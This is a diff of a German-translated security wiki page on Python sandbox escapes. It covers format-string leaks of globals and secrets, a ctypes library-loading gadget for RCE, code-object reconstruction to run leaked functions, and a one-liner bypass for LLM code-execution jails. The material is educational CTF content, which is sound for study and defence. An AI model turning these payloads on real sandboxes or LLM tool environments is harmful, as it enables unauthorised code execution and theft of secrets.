 ## Python Format String
 
-Wenn Sie eine **Zeichenkette** an Python senden, die **formatiert** werden soll, können Sie `{}` verwenden, um auf **interne Informationen von Python** zuzugreifen. Sie können die vorherigen Beispiele verwenden, um auf Globals oder Builtins zuzugreifen, zum Beispiel.
+Wenn du einen **string** an python schickst, der **formatiert** wird, kannst du `{}` verwenden, um auf **python interne Informationen.** zuzugreifen. Du kannst die vorherigen Beispiele verwenden, um zum Beispiel auf globals oder builtins zuzugreifen.
 ```python
 # Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
 CONFIG = {
@@ -682,16 +691,16 @@ people = PeopleInfo('GEEKS', 'FORGEEKS')
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
 get_name_for_avatar(st, people_obj = people)
 ```
-Beachten Sie, wie Sie **Attribute** auf normale Weise mit einem **Punkt** wie `people_obj.__init__` und **Dictionärelemente** mit **Klammern** ohne Anführungszeichen `__globals__[CONFIG]` zugreifen können.
+Beachte, wie du **auf Attribute zugreifen** kannst auf normale Weise mit einem **Punkt** wie `people_obj.__init__` und **dict-Elemente** mit **eckigen Klammern** ohne Anführungszeichen `__globals__[CONFIG]`
 
-Beachten Sie auch, dass Sie `.__dict__` verwenden können, um Elemente eines Objekts aufzulisten `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`.
+Beachte auch, dass du `.__dict__` verwenden kannst, um Elemente eines Objekts aufzulisten `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
 
-Einige andere interessante Eigenschaften von Format-Strings sind die Möglichkeit, die **Funktionen** **`str`**, **`repr`** und **`ascii`** im angegebenen Objekt auszuführen, indem Sie **`!s`**, **`!r`**, **`!a`** jeweils hinzufügen:
+Weitere interessante Eigenschaften von format strings sind die Möglichkeit, die **Funktionen** **`str`**, **`repr`** und **`ascii`** auf dem angegebenen Objekt auszuführen, indem man jeweils **`!s`**, **`!r`**, **`!a`** anhängt:
 ```python
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
 get_name_for_avatar(st, people_obj = people)
 ```
-Darüber hinaus ist es möglich, **neue Formatter** in Klassen zu **codieren**:
+Außerdem ist es möglich, in Klassen **neue Formatter zu implementieren**:
 ```python
 class HAL9000(object):
 def __format__(self, format):
@@ -702,10 +711,10 @@ return 'HAL 9000'
 '{:open-the-pod-bay-doors}'.format(HAL9000())
 #I'm afraid I can't do that.
 ```
-**Weitere Beispiele** zu **Format** **String** Beispielen finden Sie unter [**https://pyformat.info/**](https://pyformat.info)
+**Weitere Beispiele** zu **format** **string**-Beispielen finden Sie unter [**https://pyformat.info/**](https://pyformat.info)
 
-> [!VORSICHT]
-> Überprüfen Sie auch die folgende Seite auf Gadgets, die r**e sensitive Informationen aus internen Python-Objekten** lesen:
+> [!CAUTION]
+> Prüfen Sie auch die folgende Seite auf Gadgets, die **sensible Informationen aus Python-internen Objekten lesen**:
 
 
 {{#ref}}
@@ -728,22 +737,22 @@ secret_variable = "clueless"
 x = new_user.User(username='{i.find.__globals__[so].mapperlib.sys.modules[__main__].secret_variable}',password='lol')
 str(x) # Out: clueless
 ```
-### LLM Jails umgehen
+### LLM Jails bypass
 
-Von [hier](https://www.cyberark.com/resources/threat-research-blog/anatomy-of-an-llm-rce): `().class.base.subclasses()[108].load_module('os').system('dir')`
+Von [here](https://www.cyberark.com/resources/threat-research-blog/anatomy-of-an-llm-rce): `().class.base.subclasses()[108].load_module('os').system('dir')`
 
-### Von Format zu RCE Bibliotheken laden
+### Vom Format-String zur RCE beim Laden von Bibliotheken
 
-Laut der [**TypeMonkey Herausforderung aus diesem Bericht**](https://corgi.rip/posts/buckeye-writeups/) ist es möglich, beliebige Bibliotheken von der Festplatte zu laden, indem man die Format-String-Schwachstelle in Python ausnutzt.
+Laut dem [**TypeMonkey chall from this writeup**](https://corgi.rip/posts/buckeye-writeups/) ist es möglich, beliebige Bibliotheken von der Festplatte zu laden, indem man die Format-String-Schwachstelle in python ausnutzt.
 
-Zur Erinnerung: Jedes Mal, wenn eine Aktion in Python ausgeführt wird, wird eine Funktion aufgerufen. Zum Beispiel wird `2*3` **`(2).mul(3)`** ausführen oder **`{'a':'b'}['a']`** wird **`{'a':'b'}.__getitem__('a')`** sein.
+Zur Erinnerung: Jedes Mal, wenn in python eine Aktion ausgeführt wird, wird eine Funktion ausgeführt. Zum Beispiel führt `2*3` **`(2).mul(3)`** aus oder `{'a':'b'}['a']` entspricht **`{'a':'b'}.__getitem__('a')`**.
 
-Es gibt mehr davon im Abschnitt [**Python-Ausführung ohne Aufrufe**](#python-execution-without-calls).
+Mehr davon findest du im Abschnitt [**Python execution without calls**](#python-execution-without-calls).
 
-Eine Python-Format-String-Schwachstelle erlaubt es nicht, Funktionen auszuführen (es erlaubt nicht die Verwendung von Klammern), daher ist es nicht möglich, RCE wie `'{0.system("/bin/sh")}'.format(os)` zu erhalten.\
-Es ist jedoch möglich, `[]` zu verwenden. Daher, wenn eine gängige Python-Bibliothek eine **`__getitem__`** oder **`__getattr__`** Methode hat, die beliebigen Code ausführt, ist es möglich, diese auszunutzen, um RCE zu erhalten.
+Eine python Format-String-Schwachstelle erlaubt es nicht, Funktionen auszuführen (es dürfen keine parenthesis benutzt werden), daher ist z.B. `'{0.system("/bin/sh")}'.format(os)` nicht möglich.\
+Allerdings lässt sich `[]` verwenden. Wenn eine gängige python-Bibliothek also eine **`__getitem__`** oder **`__getattr__`**-Methode hat, die beliebigen Code ausführt, lässt sich diese zum Erreichen von RCE missbrauchen.
 
-Auf der Suche nach einem solchen Gadget in Python schlägt der Bericht diese [**Github-Suchanfrage**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28__getitem__%7C__getattr__%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F&type=code) vor. Dort fand er dieses [eine](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/__init__.py#L463):
+Bei der Suche nach einem solchen Gadget in python schlägt das Writeup diese [**Github search query**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28__getitem__%7C__getattr__%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F&type=code) vor. Dort fand er dieses [one](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/__init__.py#L463):
 ```python
 class LibraryLoader(object):
 def __init__(self, dlltype):
@@ -765,20 +774,20 @@ return getattr(self, name)
 cdll = LibraryLoader(CDLL)
 pydll = LibraryLoader(PyDLL)
 ```
-Dieses Gadget ermöglicht es, eine **Bibliothek von der Festplatte zu laden**. Daher ist es notwendig, die Bibliothek irgendwie **zu schreiben oder hochzuladen**, um sie korrekt auf dem angegriffenen Server zu laden.
+Dieses Gadget ermöglicht es, **eine Bibliothek von der Festplatte zu laden**. Deshalb muss **die zu ladende Bibliothek geschrieben oder hochgeladen** werden, und zwar korrekt für den angegriffenen Server kompiliert.
 ```python
 '{i.find.__globals__[so].mapperlib.sys.modules[ctypes].cdll[/path/to/file]}'
 ```
-Die Herausforderung missbraucht tatsächlich eine andere Schwachstelle im Server, die es ermöglicht, beliebige Dateien auf der Festplatte des Servers zu erstellen.
+Die Challenge nutzt tatsächlich eine andere Schwachstelle im Server aus, die es erlaubt, beliebige Dateien auf der Festplatte des Servers zu erstellen.
 
-## Zerlegen von Python-Objekten
+## Untersuchung von Python-Objekten
 
 > [!TIP]
-> Wenn Sie mehr über **python bytecode** erfahren möchten, lesen Sie diesen **tollen** Beitrag zu dem Thema: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
+> Wenn du **mehr** über **python bytecode** im Detail lernen möchtest, lies diesen **großartigen** Beitrag zum Thema: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 
-In einigen CTFs könnte Ihnen der Name einer **benutzerdefinierten Funktion, in der sich das Flag** befindet, bereitgestellt werden, und Sie müssen die **Interna** der **Funktion** einsehen, um es zu extrahieren.
+In einigen CTFs kann dir der Name einer **custom function where the flag** gegeben werden, und du musst die **internals** der **function** ansehen, um sie zu extrahieren.
 
-Dies ist die Funktion, die untersucht werden soll:
+Das ist die function, die es zu untersuchen gilt:
 ```python
 def get_flag(some_input):
 var1=1
@@ -798,7 +807,7 @@ dir(get_flag) #Get info tof the function
 ```
 #### globals
 
-`__globals__` und `func_globals` (gleich) Erhält die globale Umgebung. Im Beispiel sehen Sie einige importierte Module, einige globale Variablen und deren Inhalt, die deklariert sind:
+`__globals__` und `func_globals` (gleich) geben die globale Umgebung zurück. Im Beispiel kann man einige importierte Module, einige globale Variablen und deren deklarierten Inhalte sehen:
 ```python
 get_flag.func_globals
 get_flag.__globals__
@@ -807,11 +816,11 @@ get_flag.__globals__
 #If you have access to some variable value
 CustomClassObject.__class__.__init__.__globals__
 ```
-[**Siehe hier weitere Orte, um Globals zu erhalten**](#globals-and-locals)
+[**See here more places to obtain globals**](#globals-and-locals)
 
 ### **Zugriff auf den Funktionscode**
 
-**`__code__`** und `func_code`: Sie können dieses **Attribut** der Funktion **zugreifen**, um das **Code-Objekt** der Funktion zu **erhalten**.
+**`__code__`** und `func_code`: Sie können **auf dieses Attribut** der Funktion **zugreifen**, um das **Code-Objekt** der Funktion zu **erhalten**.
 ```python
 # In our current example
 get_flag.__code__
@@ -825,7 +834,7 @@ compile("print(5)", "", "single")
 dir(get_flag.__code__)
 ['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_stacksize', 'co_varnames']
 ```
-### Code-Information abrufen
+### Code-Informationen abrufen
 ```python
 # Another example
 s = '''
@@ -871,7 +880,7 @@ get_flag.__code__.co_freevars
 get_flag.__code__.co_code
 'd\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S'
 ```
-### **Disassemblierung einer Funktion**
+### **Disassemblieren einer Funktion**
 ```python
 import dis
 dis.dis(get_flag)
@@ -899,7 +908,7 @@ dis.dis(get_flag)
 44 LOAD_CONST               0 (None)
 47 RETURN_VALUE
 ```
-Beachten Sie, dass **wenn Sie `dis` im Python-Sandbox nicht importieren können**, Sie den **Bytecode** der Funktion (`get_flag.func_code.co_code`) erhalten und ihn lokal **disassemblieren** können. Sie werden den Inhalt der geladenen Variablen (`LOAD_CONST`) nicht sehen, aber Sie können sie aus (`get_flag.func_code.co_consts`) erraten, da `LOAD_CONST` auch den Offset der geladenen Variablen angibt.
+Beachte, dass du, falls du `dis` in der python sandbox nicht importieren kannst, den bytecode der Funktion (`get_flag.func_code.co_code`) erhalten und ihn lokal disassemble kannst. Du wirst den Inhalt der geladenen Variablen (`LOAD_CONST`) nicht sehen, aber du kannst sie aus (`get_flag.func_code.co_consts`) erraten, weil `LOAD_CONST` auch den Offset der geladenen Variable angibt.
 ```python
 dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
 0 LOAD_CONST          1 (1)
@@ -921,10 +930,10 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 44 LOAD_CONST          0 (0)
 47 RETURN_VALUE
 ```
-## Kompilieren von Python
+## Python kompilieren
 
-Jetzt stellen wir uns vor, dass Sie irgendwie **Informationen über eine Funktion dumpen können, die Sie nicht ausführen können**, aber Sie **müssen** sie **ausführen**.\
-Wie im folgenden Beispiel, Sie **können auf das Code-Objekt** dieser Funktion zugreifen, aber nur durch das Lesen der Disassemblierung **wissen Sie nicht, wie Sie das Flag berechnen** (_stellen Sie sich eine komplexere `calc_flag`-Funktion vor_)
+Stellen wir uns nun vor, dass man irgendwie die **Informationen über eine Funktion dumpen kann, die man nicht ausführen kann**, aber man sie **musst** **ausführen**.\  
+Wie im folgenden Beispiel kann man **auf das code object zugreifen** dieser Funktion, aber allein durch das Lesen des disassemble weiß man **nicht, wie man den flag berechnet** (_stell dir eine komplexere `calc_flag`-Funktion vor_)
 ```python
 def get_flag(some_input):
 var1=1
@@ -937,9 +946,9 @@ return calc_flag("VjkuKuVjgHnci")
 else:
 return "Nope"
 ```
-### Erstellen des Code-Objekts
+### Erstellen des code object
 
-Zuerst müssen wir wissen, **wie man ein Code-Objekt erstellt und ausführt**, damit wir eines erstellen können, um unsere Funktion auszuführen, die geleakt wurde:
+Zuerst müssen wir wissen, **wie man ein code object erstellt und ausführt**, damit wir eines erstellen können, um unsere function leaked auszuführen:
 ```python
 code_type = type((lambda: None).__code__)
 # Check the following hint if you get an error in calling this
@@ -959,7 +968,7 @@ mydict['__builtins__'] = __builtins__
 function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 > [!TIP]
-> Je nach Python-Version können die **Parameter** von `code_type` eine **andere Reihenfolge** haben. Der beste Weg, um die Reihenfolge der Parameter in der Python-Version, die Sie ausführen, zu erfahren, ist, Folgendes auszuführen:
+> Je nach python-Version können die **Parameter** von `code_type` eine **andere Reihenfolge** haben. Der beste Weg, die Reihenfolge der Params in der python-Version, die du ausführst, herauszufinden, ist, folgendes auszuführen:
 >
 > ```
 > import types
@@ -967,10 +976,10 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 > 'code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize,\n      flags, codestring, constants, names, varnames, filename, name,\n      firstlineno, lnotab[, freevars[, cellvars]])\n\nCreate a code object.  Not for the faint of heart.'
 > ```
 
-### Rekreation einer geleakten Funktion
+### Rekonstruieren einer leaked function
 
 > [!WARNING]
-> Im folgenden Beispiel werden wir alle Daten nehmen, die benötigt werden, um die Funktion direkt aus dem Funktions-Codeobjekt zu rekreieren. In einem **realen Beispiel** sind alle **Werte**, um die Funktion **`code_type`** auszuführen, das, was **Sie leaken müssen**.
+> Im folgenden Beispiel entnehmen wir alle Daten, die benötigt werden, um die function direkt aus dem function code object zu rekonstruieren. In einem **realen Beispiel** sind alle **Werte** zum Ausführen der Funktion **`code_type`** genau das, **was du leak** musst.
 ```python
 fc = get_flag.__code__
 # In a real situation the values like fc.co_argcount are the ones you need to leak
@@ -981,12 +990,12 @@ mydict['__builtins__'] = __builtins__
 function_type(code_obj, mydict, None, None, None)("secretcode")
 #ThisIsTheFlag
 ```
-### Bypass Defenses
+### Schutzmechanismen umgehen
 
-In previous examples at the beginning of this post, you can see **wie man jeden Python-Code mit der `compile`-Funktion ausführt**. Dies ist interessant, weil man **ganze Skripte** mit Schleifen und allem in einer **einzeiligen Anweisung** ausführen kann (und wir könnten dasselbe mit **`exec`** tun).\
-Wie auch immer, manchmal könnte es nützlich sein, ein **kompiliertes Objekt** auf einer lokalen Maschine zu **erstellen** und es auf der **CTF-Maschine** auszuführen (zum Beispiel, weil wir die `compiled`-Funktion in der CTF nicht haben).
+In den vorherigen Beispielen am Anfang dieses Beitrags kannst du sehen, **wie man beliebigen python-Code mit der `compile`-Funktion ausführt**. Das ist interessant, weil man **komplette Skripte** mit Schleifen und allem in einem **one liner** ausführen kann (und wir könnten dasselbe mit **`exec`** tun).\
+Manchmal kann es jedoch nützlich sein, ein **compiled object** auf einer lokalen Maschine zu **erstellen** und es auf der **CTF machine** auszuführen (zum Beispiel weil wir die `compiled`-Funktion im CTF nicht haben).
 
-For example, let's compile and execute manually a function that reads _./poc.py_:
+Zum Beispiel kompilieren und führen wir manuell eine Funktion aus, die _./poc.py_ liest:
 ```python
 #Locally
 def read():
@@ -1013,7 +1022,7 @@ mydict['__builtins__'] = __builtins__
 codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
 function_type(codeobj, mydict, None, None, None)()
 ```
-Wenn Sie `eval` oder `exec` nicht aufrufen können, könnten Sie eine **richtige Funktion** erstellen, aber der direkte Aufruf wird normalerweise mit: _Konstruktor im eingeschränkten Modus nicht zugänglich_ fehlschlagen. Daher benötigen Sie eine **Funktion, die sich nicht in der eingeschränkten Umgebung befindet, um diese Funktion aufzurufen.**
+Wenn du nicht auf `eval` oder `exec` zugreifen kannst, könntest du eine **richtige Funktion** erstellen, aber ein direkter Aufruf schlägt normalerweise mit der Fehlermeldung _constructor not accessible in restricted mode_ fehl. Deshalb brauchst du eine **Funktion außerhalb der eingeschränkten Umgebung, die diese Funktion aufruft.**
 ```python
 #Compile a regular print
 ftype = type(lambda: None)
@@ -1021,23 +1030,23 @@ ctype = type((lambda: None).func_code)
 f = ftype(ctype(1, 1, 1, 67, '|\x00\x00GHd\x00\x00S', (None,), (), ('s',), 'stdin', 'f', 1, ''), {})
 f(42)
 ```
-## Decompiling Compiled Python
+## Decompiling Kompiliertes python
 
-Mit Tools wie [**https://www.decompiler.com/**](https://www.decompiler.com) kann man gegebenen kompilierte Python-Code **dekompilieren**.
+Mit Werkzeugen wie [**https://www.decompiler.com/**](https://www.decompiler.com) kann man **decompile** gegebenen kompilierten python-Code.
 
-**Schau dir dieses Tutorial an**:
+**Sieh dir dieses Tutorial an**:
 
 
 {{#ref}}
 ../../basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md
 {{#endref}}
 
-## Misc Python
+## Sonstiges zu python
 
 ### Assert
 
-Python, das mit Optimierungen und dem Parameter `-O` ausgeführt wird, entfernt Assert-Anweisungen und jeglichen Code, der von dem Wert von **debug** abhängt.\
-Daher sind Überprüfungen wie
+Bei Ausführung von python mit Optimierungen über den Parameter `-O` werden asset statements und jeglicher Code, der von dem Wert von **debug** abhängt, entfernt.\
+Daher werden Prüfungen wie
 ```python
 def check_permission(super_user):
 try:
@@ -1048,7 +1057,7 @@ print(f"\nNot a Super User!!!\n")
 ```
 wird umgangen
 
-## Referenzen
+## Quellen
 
 - [https://lbarman.ch/blog/pyjail/](https://lbarman.ch/blog/pyjail/)
 - [https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/)
@@ -1056,5 +1065,8 @@ wird umgangen
 - [https://gynvael.coldwind.pl/n/python_sandbox_escape](https://gynvael.coldwind.pl/n/python_sandbox_escape)
 - [https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html](https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html)
 - [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
+- [CVE-2023-33733 (ReportLab rl_safe_eval expression evaluation RCE) – NVD](https://nvd.nist.gov/vuln/detail/cve-2023-33733)
+- [c53elyas/CVE-2023-33733 PoC and write-up](https://github.com/c53elyas/CVE-2023-33733)
+- [0xdf: University (HTB) – Exploiting xhtml2pdf/ReportLab CVE-2023-33733 to gain RCE](https://0xdf.gitlab.io/2025/08/09/htb-university.html)
 
 {{#include ../../../banners/hacktricks-training.md}}
